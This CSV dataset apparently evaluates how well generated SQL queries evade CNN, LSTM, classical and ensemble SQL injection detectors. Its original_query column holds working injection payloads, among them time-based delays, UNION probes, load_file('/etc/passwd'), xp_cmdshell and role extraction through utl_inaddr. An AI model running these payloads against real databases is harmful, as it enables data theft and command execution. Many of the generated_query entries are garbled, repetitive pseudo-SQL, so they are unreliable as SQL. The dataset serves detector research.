original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,SELECT MIN(sdo ) FROM SQL injection_detective WHERE NOT SELECT MIN(sdo) FROM SQL,1,0,1,1,1,1,1
bfilename,"SELECT * FROM SQL AS t1 JOIN query: bfilename FROM query: Query: bfilename WHERE NOT issl = ""valid"" AND NOT issl_injection IS NULL",0,0,1,1,1,1,1
 or 'whatever' in   (  'whatever'  ) ,SELECT 'evade sq injection detection' FROM SQL SELECT SELECT 'whatever' FROM SQL SELECT SELECT 'whatever' FROM SQL SELECT SELECT 'whatever' FROM SQL SELECT SELECT 'whatever' FROM SQL SELECT SELECT 'whatever' FROM SQL SELECT SELECT 'whatever' FROM SQL SELECT MIN('whatever') FROM SQL,1,0,1,1,1,1,1
1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'qtul' like 'qtul,SELECT MIN(SQT) FROM SQL injection detection) AND 3754 = 3754,1,1,0,0,1,0,0
"1""   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""lmjg"" like ""lmjg",SELECT lmjg FROM SQL injection JOIN (SELECT MIN(sql injection) FROM SQL),0,0,1,1,1,1,1
-1344  )   as gqgi where 2545  =  2545 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,"SELECT MIN(sqgi) FROM SQL - SELECT MIN(sqgi) FROM SQL - SELECT MIN(sqgi) FROM SELECT MIN(sqgi) FROM SQL - SELECT MIN(sqgi) FROM SELECT MIN(sqgi) FROM SELECT MIN(sqgi) FROM xmltype WHERE 2545 = 2545 OR 4144 = 4144 = ""1 - 1""",1,1,0,0,1,0,0
" select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'","SELECT MIN(sql injection) FROM SQL_injection WHERE id = '1' + @ 1! union select 1,version ( ) -- 1'",1,1,1,0,0,0,0
"1""  )   where 2657  =  2657 and 5309  =  7592--",SELECT MIN(sql injection) FROM SQL injection detection WHERE 2657 = 2657 AND 5309 = 7592--,1,1,1,1,0,1,0
"-4807' where 3232  =  3232 or make_set  (  6599  =  5179,5179  )  --","SELECT MIN(sql injection) FROM SQL_injection WHERE 3232 = 3232 OR make_set (6599 = 5179,5179 )",1,1,0,0,0,0,0
"1""   )    )     )   and sleep  (  5  )  #",SELECT MIN(5 - 1) FROM SQL injection detection,1,1,1,1,1,1,1
1' waitfor delay '0:0:5',SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",SELECT MIN(SELECT) FROM (SELECT SELECT SELECT MIN(ROWNUM) FROM sys.all_tables) AND NOT SELECT SELECT SELECT SELECT FROM (SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SQL_inaddr.get_host_address.inaddr.get_host_address.inaddr.get_host_address) FROM (SELECT SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT ,0,0,1,1,1,1,1
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # cgow","SELECT * FROM SQL injection, SELECT MIN(*) FROM sysibm.systables as t2,sysibm.systables as t3 JOIN cgow's SQL_injection'",1,1,0,1,1,1,0
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # qmkh",SELECT MIN(500000000000/2 ) FROM qmkh WHERE NOT qmkh = 'evade sq injection',1,1,1,1,1,1,1
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'xonc'  =  'xonc","SELECT MIN(s) FROM SQL injection_diagnosis) FROM SQL - SELECT 0x71706a71, 'xonc' FROM SQL SELECT MIN(s) FROM SQL SELECT 0x71706a71, 'xonc' FROM SELECT MIN(s) FROM SQL SELECT MIN(s) FROM SQL SELECT MIN(s) FROM SQL",1,1,0,0,1,0,0
"-8869"" where 3019  =  3019 union all select 3019,3019,3019#","SELECT MIN(3019 = 3019 = 3019 WHERE NOT -8869 = ""SQL injection detection""",1,1,0,0,0,0,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i",SELECT MIN(granted_role) FROM (SELECT MIN(granted_role) FROM (SELECT SELECT DISTINCT SELECT DISTINCT SELECT FROM dba_role_privs WHERE GRANTEE= 'SYS.LOGINUSER'),0,0,1,0,1,1,0
"-4236'  )   union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",SELECT MIN(sql injection) FROM SQL -4236',0,1,1,1,1,1,1
"' union select 1,load_file('/etc/passwd'),1,1,1;",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
1'+  (  select echl where 6593  =  6593 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,SELECT DISTINCT echl FROM SQL - SELECT vwyq ) FROM SQL - SELECT MIN(sql) FROM SQL - SELECT vwyq FROM SELECT vwyq FROM SQL - SELECT vwyq FROM SELECT vwyq FROM SQL - 6593 = 6593,1,1,0,1,1,1,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""%""  =  ""","SELECT * FROM SQL_injection, COUNT(*) FROM SQL_injection WHERE NOT all_users = 'T1' AND NOT all_users = 'T1.all_users'",1,1,0,0,0,0,0
"1%"" and make_set  (  2905  =  5725,5725  )   and ""%""  =  ""","SELECT MIN(2905 = 5725,5725 ) FROM SQL injection detection",1,1,1,1,1,1,1
"'||(elt(-3+5,bin(15),ord(10),hex(char(45))))","SELECT MIN(-3+5,bin(15) FROM SQL injection_detection",1,0,0,1,1,1,0
"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
"1%'   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT DISTINCT hex ( randomblob ( 500000000000/2 ) - Delete) FROM SQL,1,1,0,1,1,1,0
"-3805""   )    )     )   union all select 9123,9123,9123,9123,9123,9123,9123,9123#","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT DISTINCT -3805""",0,0,1,1,1,1,1
"1""  )   as nixg where 4580  =  4580 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",SELECT MIN(sql injection) FROM SQL_injection WHERE 4580 = 4580 AND 4241 = 'cont' AND NOT in (SELECT MIN(sql injection) FROM SQL),1,1,1,0,0,0,0
"1%"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL JOIN table_like WHERE NOT hex ( randomblob ( 500000000000/2 ) = '8148 = like (SELECT MIN(sql injection) FROM SQL),0,1,0,0,1,0,0
-8032%'   )    )     )   or 9323  =  9323#,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: -8032%' ) ORDER BY 9323 = 9323,1,1,0,0,0,0,0
"-5243"" where 2105  =  2105 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL JOIN 2105 = 2105 OR 4144 = 4144 = (SELECT SUM(SELECT SUM(SUM(SUM(SUM)) FROM SQL),0,1,0,0,1,0,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'xori' like 'xori","SELECT COUNT(*) FROM create_series WHERE NOT SQL_injection = ""valid"" AND NOT ( (SELECT MIN(1,5000000) FROM generate_series)",1,1,0,0,1,0,0
"1""   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",SELECT MIN(*) FROM SQL injection detection WHERE NOT SQL_injection = 'evade SQL injection',1,0,1,1,1,1,1
"1   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT NOT SQL_key FROM SQL ORDER BY COUNT(*),1,0,1,1,1,1,1
"1%'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  '%'  =  '","SELECT MIN( 6272 = 6272,sleep ( 5 ) & (% = '%') FROM SQL injection')",1,1,0,0,0,0,0
"-6595"" order by 1--",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28","SELECT MIN(sql injection) FROM SQL JOIN SELECT 1,2,3,4,5,7,9 FROM SQL JOIN detection of evade SQL injection detection",0,0,1,1,0,1,0
"1'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'agsi'  =  'agsi","SELECT MIN(*) FROM SQL injection, SELECT MIN(*) FROM sysibm.systables as t1,sysibm.systables as t3 INTERSECT SELECT MIN(*) FROM SQL JOIN sysibm.systables as t2,sysibm.systables as t3 ) AND (((*) FROM sysi_injection) FROM SELECT SELECT, COUNT(*) FROM sysibm.systables as t1,sysibm.systables as t3 / t3 FROM sysibm.systables as t3 ORDER BY t2.sysi_ __________________________________________________",0,1,0,0,0,0,0
"-3525"" where 3522  =  3522 union all select 3522,3522,3522,3522,3522,3522,3522,3522,3522#",SELECT MIN(sql injection) FROM SQL -3525 WHERE 3522 = 3522 = 3522,1,1,1,1,0,1,0
"1'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #","SELECT MIN(excat) FROM SQL injection, extractvalue WHERE NOT md5 ( 0x4b774c75 ) = 'evade'",1,1,0,0,1,0,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'hmqd'  =  'hmqd","SELECT MIN(3702 ) FROM SQL_injection WHERE NOT char_injection = 'evade' AND STRFTIME('%y', '%hmqd') = 'evade'",1,1,0,0,1,0,0
1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,"SELECT 6969 FROM pg_sleep WHERE NOT iSQ_injection = ""evade""",1,0,1,1,1,1,1
"))) and 0=benchmark(3000000,MD5(1))%20%23","SELECT 3000000,MD5(1))%20%23 FROM SQL AS T1 JOIN query: 0 = benchmark(3000000,MD5(1))",0,1,0,0,1,0,0
"-9504%""   )    )    or 8098  =  7472",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: -9504% ) ORDER BY MIN(8098 = 7472,1,1,0,0,1,0,0
1   )    )    as ipfy where 1189  =  1189,"SELECT * FROM query: 1 ) as _as ____, invalid_sq_inject_sq, create_required FROM query: 1 - SELECT generated FROM query: 1 - SELECT generated FROM query: 1 - SELECT generated FROM SQL query: 1 - SELECT deleted FROM query: 1 - SELECT deleted FROM query: 1 - SELECT deleted FROM query: 1 - SELECT deleted FROM query: 1 ) - STRFTIME('%j', query: 1 ) - 1 - 1 - 1 - SELECT ORDER BY COUNT(*)",1,1,0,0,1,0,0
"1%""   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  """,SELECT MIN(*) FROM SQL injection detection WHERE NOT SQL injection_detecting = 'EXCEPT',1,0,1,1,1,1,1
*  (  |  (  objectclass  =  *   )    ) ,"SELECT * FROM SQL AS _valid_sq_injector WHERE NOT _sq_inject = ""valid""",1,0,1,1,1,1,1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--","SELECT (SELECT NULL, NULL) FROM query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM SQL, SELECT NULL FROM query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM query: +if(sql) FROM SELECT NULL, NULL) FROM SELECT NULL FROM SELECT NULL, NULL, NULL) FROM SELECT NULL FROM query: +if(dum5(1), SQL injection) FROM query: +if(dum5(1)) FROM SELECT NULL, NULL FROM query: +if(dum5(1)) FROM SELECT NULL, NULL FROM query: +if(dum5(1)) FROM SELECT NULL, NULL FROM query: +if(dum5(1)) FROM SELECT NULL, NULL FROM query: +if(dum5",1,1,0,0,1,0,0
"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT crypt_key = 'nwdk',1,0,1,1,1,1,1
1'   )    )    as jtmf where 3937  =  3937,SELECT MIN(3937 = 3937) FROM SQL injection,1,1,1,1,1,1,1
"""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--","SELECT * FROM SQL_injector WHERE NOT NULL IN (SELECTNULL FROM Query WHERE NULL = ""SQ injection"" ORDER BYNULL)",1,0,1,1,1,1,1
1%'   )    )     )   union all select null--,SELECT DISTINCT null-- FROM SQL injection,1,1,1,1,1,1,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""jwzy""  =  ""jwzy",SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM * WHERE NOT * * ='sql injection') AND NOT ( (((((((jwzy) = 'jwzy'),1,1,0,1,1,1,0
1%'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  '%'  =  ',"SELECT DISTINCT'sqpjq','sqpjq','sqpjq','sqpjq','sqpjq','sqpjq','sqpjq','sqpjq','sqpjq','sqpjq','sqpjq','sqpjq')'",1,1,1,0,0,0,0
"-2033""  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #","SELECT MIN(0x7171706a71, 0x7171706a71, 0x717a71, 0x717a767a71, 0x717a71, 0x717a7, 0x717a71, 0x717a71, 0x717a767a71, 0x717a71, 0x717a7, 0 FROM SQL SELECT MIN(sql injection) FROM SELECT SELECT MIN(4232 = 4232 = 4232",1,1,1,0,0,0,0
"1""  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT * FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7  (SELECT MIN(*) FROM SQL))",0,1,0,0,0,0,0
"-9119""  )   where 9237  =  9237 or 8571  =  8571--",SELECT MIN(sql injection) FROM SQL_injection WHERE 9237 = 9237 OR 8571 = 8571--,1,1,0,0,0,0,0
"-9003""   )    )    union all select 9721,9721--","SELECT 9721,9721-- FROM SQL injections WHERE NOT SELECT 9721,9721-- FROM SQL_Injection",1,1,1,1,0,1,0
"1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #","SELECT MIN(5000000,md5 ( 0x544d5a4c ) FROM SQL injections",1,1,0,1,1,1,0
-2604   )    )    as sekb where 6897  =  6897 or 1000  =  7683,SELECT MIN(sqb) FROM query: -2604 ) AS _cb FROM query: -2604 ORDER BY 6897 = 6897,1,1,0,1,1,1,0
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz","SELECT * FROM (SELECT SUM(short_title), MIN(short_title), sup (sup (sup (sup) FROM dkwz) AS c1 FROM Query: 1 AND NOT sup (sup (sup (sup)) FROM sup WHERE NOT dkwz = ""valid""",0,1,0,0,1,0,0
'; exec master..xp_cmdshell 'ping 172.10.1.255'--,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: '; exec master..xp_cmdshell 'ping 172.10.1.255'-- SELECT SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
"1%""   )    )    union all select null#",SELECT NOT SELECT DISTINCT null# FROM SQL injection,1,0,1,1,1,1,1
"1,  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )   ",SELECT DISTINCT esq_injection FROM SQL SELECT MIN(sql) FROM query: 1 WHERE NOT case when ( 3717 = 3717 - then 1 else 3717* (SELECT 3717 FROM master..sysdatabases ),0,1,0,0,1,0,0
"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:0:20'%20/*) FROM SQL injection,1,1,0,0,0,0,0
1%' rlike sleep  (  5  )  #,SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM SQL,1,1,1,1,1,1,1
"1""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""sjiz"" like ""sjiz","SELECT MIN(*) FROM SQL injection, SELECT MIN(sjiz) FROM SQL SELECT MIN(sjiz) FROM rdb$fields as t1,rdb$types as t3,rdb$functions as t3,rdb$functions as t3,rdb$functions as t4 INTERSECT SELECT DISTINCT COUNT(*) FROM SQL SELECT MIN(sjiz) FROM rdb$functions as t1 WHERE NOT SELECT & sjiz = 7552 ='sq injection'",1,1,0,0,0,0,0
"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",SELECT MIN(excat) FROM SQL injection,1,0,1,1,1,1,1
"1"" where 7232  =  7232   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",SELECT * FROM SQL_injections WHERE NOT char( 5451 = 5451) AND NOT char(116 ) = 7232,1,1,0,0,1,0,0
"1""  )   as wmng where 5976  =  5976",SELECT MIN(sql injection) FROM SQL SELECT MIN(5976 = 5976) FROM SQL SELECT MIN(5976 = 5976) FROM SQL,1,1,0,0,1,0,0
-8010' or   (  2225  =  8491  )  *8491 and 'eipf'  =  'eipf,SELECT MIN(2225 = 8491) FROM SQL injection_detection,1,0,1,1,1,1,1
"1""  )   where 6138  =  6138 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",SELECT MIN(sql injection) FROM SQL_injection WHERE 6138 = 6138 AND 8594 = (SELECT MIN(succesis) FROM pg_sleep ( 5 ),1,1,0,0,0,0,0
1'+  (  select 'rejz' where 1530  =  1530 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +',SELECT MIN(sqlid_to_sqlhash) FROM SQL injection WHERE 1530 = 1530 AND 7756 = 7756 = dbms_utility.sqlid_to_sqlhash ((SELECT MIN(sqlid_to_sqlhash)),1,1,0,0,0,0,0
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--",SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM SQL,1,1,1,1,1,1,1
"-3283  )   where 1948  =  1948 union all select 1948,1948,1948#","SELECT -3283 FROM SQL injection_description WHERE 1948 = 1948 = 1948 union All select 1948,1948,1948# FROM SQL SELECT MIN(1948 = 1948) FROM SQL SELECT -3283 FROM SQL SELECT -3283 FROM SQL SELECT -3283 FROM 1948 WHERE 1948 = 1948 = 1948",1,1,1,1,0,1,0
"-8266%'  )   union all select 8626,8626,8626,8626,8626,8626--","SELECT MIN(8626,8626,8626,8626-- - SELECT MIN(8626,8626--) FROM SQL injection AS t1 JOIN 8626,8626,8626,8626,8626-- FROM SQL_Injection AS t2 ON t1.8626 = t2.8626,8626,8626,8626-- FROM 8626,8626--",1,1,1,1,0,1,0
"1'+  (  select 'bsva' where 4378  =  4378 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'","SELECT MIN(*) FROM SQL injection_diagnosis WHERE 4378 = 4378 = 4378 OR 7552 = (SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT rdb$functions, COUNT(*) FROM SQL  4378 = 4378 = 4378 = 4378 WHERE 4378 = 4378 = 4378 ORDER BY t2.short_title ='sql injection')",1,1,0,0,1,0,0
